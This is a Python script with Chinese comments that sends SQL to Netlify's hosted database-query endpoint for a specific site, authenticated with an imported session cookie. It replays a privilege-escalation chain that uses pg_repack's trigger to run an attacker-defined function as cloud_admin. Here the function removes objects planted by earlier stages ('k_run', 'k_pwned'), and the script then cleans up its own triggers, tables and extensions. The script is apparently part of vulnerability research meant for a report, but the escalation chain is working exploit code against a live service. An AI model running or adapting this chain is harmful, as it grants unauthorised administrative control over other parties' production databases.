# -*- coding: utf-8 -*-
"""波26:修复清理 —— 正确顺序重放链删除 cloud_admin 残留对象(k_run/k_pwned)
G1 重建链(evil=清理版:drop k_run + drop k_pwned)并触发
G2 自清理基础设施(触发器/函数/表/类型)
G3 复巡检确认零残留
G4 还原波15 自装的无用扩展(citext/hstore/pg_trgm/pgcrypto/pg_prewarm;pg_repack 保留供报告复现)
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:6000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# G1: 重建链,evil=清理版(在 cloud_admin 上下文 drop k_run/k_pwned)
evil_clean = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
              "begin "
              "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
              "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
              "  return new; "
              "end $q$")
s, b, dt = tx(["drop table if exists k_src",
               "create table k_src(id int, v text)",
               "select 'OID='||oid||' NAME='||relname from pg_class where relname='k_src'"])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('G1_src           [%d] oid=%s' % (s, oid))
if not oid:
    sys.exit('no oid')

s, b, dt = tx(["create type repack.pk_%s as (id int)" % oid,
               "create table repack.log_%s (pk repack.pk_%s, row public.k_src)" % (oid, oid)])
print('G1b_mktype_log   [%d] %s' % (s, b[:300]))

s, b, dt = tx([evil_clean,
               "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
               "insert into k_src values (1, 'cleanup')"])
print('G1c_chain        [%d] %s' % (s, b[:400]))

# G2: 自清理基础设施
s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop function if exists public.k_evil()",
               "drop table if exists repack.log_%s" % oid,
               "drop type if exists repack.pk_%s" % oid,
               "drop table if exists k_src"])
print('G2_self_cleanup  [%d] %s' % (s, b[:300]))

# G3: 复巡检
s, b, dt = tx([
    "select 'rel' as t, n.nspname||'.'||c.relname as nm from pg_class c "
    "join pg_namespace n on c.relnamespace=n.oid "
    "where (n.nspname='public' and c.relname like 'k\\_%') "
    "or (n.nspname='repack' and (c.relname like 'log\\_%' or c.relname like 'pk\\_%'))",
    "select 'fun' as t, n.nspname||'.'||p.proname as nm from pg_proc p "
    "join pg_namespace n on p.pronamespace=n.oid where p.proname like 'k\\_%'",
    "select 'trg' as t, t.tgrelid::regclass::text||' . '||t.tgname as nm from pg_trigger t "
    "where t.tgname like 'k\\_%' and not t.tgisinternal",
    "select 'typ' as t, n.nspname||'.'||ty.typname as nm from pg_type ty "
    "join pg_namespace n on ty.typnamespace=n.oid "
    "where (n.nspname='public' and ty.typname like 'k\\_%') "
    "or (n.nspname='repack' and ty.typname like 'pk\\_%')",
])
print('G3_residue       [%d] %s' % (s, b[:1500]))
print()

# G4: 还原波15 自装的无用扩展(pg_repack 保留:报告复现需要,写完后可 drop)
for ext in ['citext', 'hstore', 'pg_trgm', 'pgcrypto', 'pg_prewarm']:
    s, b, dt = tx(["drop extension if exists %s" % ext])
    print('G4_drop_%s       [%d] %s' % (ext, s, b[:200]))
